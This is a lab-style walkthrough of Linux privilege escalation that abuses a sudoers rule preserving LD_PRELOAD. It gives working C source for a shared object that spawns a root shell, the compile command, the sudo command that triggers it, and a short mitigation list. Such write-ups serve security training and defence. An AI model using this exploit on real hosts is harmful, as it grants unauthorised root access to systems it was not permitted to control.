
## Privilege Escalation – Sudo (LD_PRELOAD Abuse)

## Enumeration

First, sudo permissions for the current user were enumerated:

```bash
sudo -l
```
Output:

```bash
Matching Defaults entries for TCM on this host:
    env_reset, env_keep+=LD_PRELOAD

User may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/apache2
```
Key Observations

* The environment variable LD_PRELOAD is preserved (env_keep+=LD_PRELOAD)
* A root-owned binary (apache2) can be executed without a password
* This combination allows LD_PRELOAD-based privilege escalation

## Exploitation (LD_PRELOAD)
### Step 1: Create a malicious shared object

A C file was created that spawns a root shell when loaded via `LD_PRELOAD`.

**exploit.c**
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void __attribute__((constructor)) shell(void) {
    setgid(0);
    setuid(0);
    system("/bin/bash");
    exit(0);
}
```
Step 2: Compile the shared library
The malicious code was compiled as a shared object:

```bash
gcc -fPIC -shared -o /tmp/exploit.so exploit.c -nostartfiles
```
Step 3: Execute a root-owned binary with LD_PRELOAD
The root-owned binary was executed with LD_PRELOAD pointing to the malicious shared object:

```bash
sudo LD_PRELOAD=/tmp/exploit.so apache2
```
When the binary is executed, the shared object is loaded first, resulting in a root shell.

 Result
 
A root shell was successfully obtained:

```bash
root@debian:/home/user# whoami
root
```
 Privilege escalation successful

## Mitigation
1.) Do not preserve LD_PRELOAD in sudoers:

```bash
Defaults !env_keep+=LD_PRELOAD
```
2.) Avoid allowing root execution of dynamic binaries via sudo

3.) Use secure_path in /etc/sudoers

4.) Regularly audit sudo permissions using:

```bash
sudo -l
```
